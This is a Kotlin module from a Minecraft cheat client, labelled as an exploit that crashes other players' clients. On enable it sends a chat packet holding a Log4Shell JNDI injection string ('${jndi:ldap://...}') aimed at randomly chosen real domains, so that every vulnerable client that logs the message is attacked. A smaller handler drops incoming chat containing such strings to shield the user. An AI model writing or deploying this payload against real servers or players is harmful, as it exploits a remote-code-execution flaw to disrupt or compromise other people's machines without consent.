package kevin.module.modules.exploit

import kevin.event.EventTarget
import kevin.event.PacketEvent
import kevin.module.Module
import kevin.module.ModuleCategory
import kevin.utils.ChatUtils
import net.minecraft.network.play.client.CPacketChatMessage
import net.minecraft.network.play.server.SPacketChat

class ClientCrasher : Module("ClientCrasher", "Use exploit crash other player client.", category = ModuleCategory.EXPLOIT) {
    override fun onEnable() {
        val m = arrayOf(
            "www.baidu.com",
            "liquidbounce.net",
            "fanyi.sogou.com",
            "github.com",
            "scriptapi.liquidbounce.net",
        ).random()
        mc.connection!!.sendPacket(CPacketChatMessage("\${jndi:ldap://$m}"))
        ChatUtils.messageWithPrefix("Sent crash packet... [$m]")
        this.state = false
    }
    @EventTarget(true)
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (packet is SPacketChat &&
            (packet.chatComponent.formattedText.contains("\${jndi:")
                    || packet.chatComponent.unformattedText.contains("\${jndi:"))) {
            event.cancelEvent()
            ChatUtils.messageWithPrefix("Â§aCancel receiving message that may trigger vulnerability!!(${packet.chatComponent.formattedText.replace("\${","").replace("}","")})")
        }
    }
}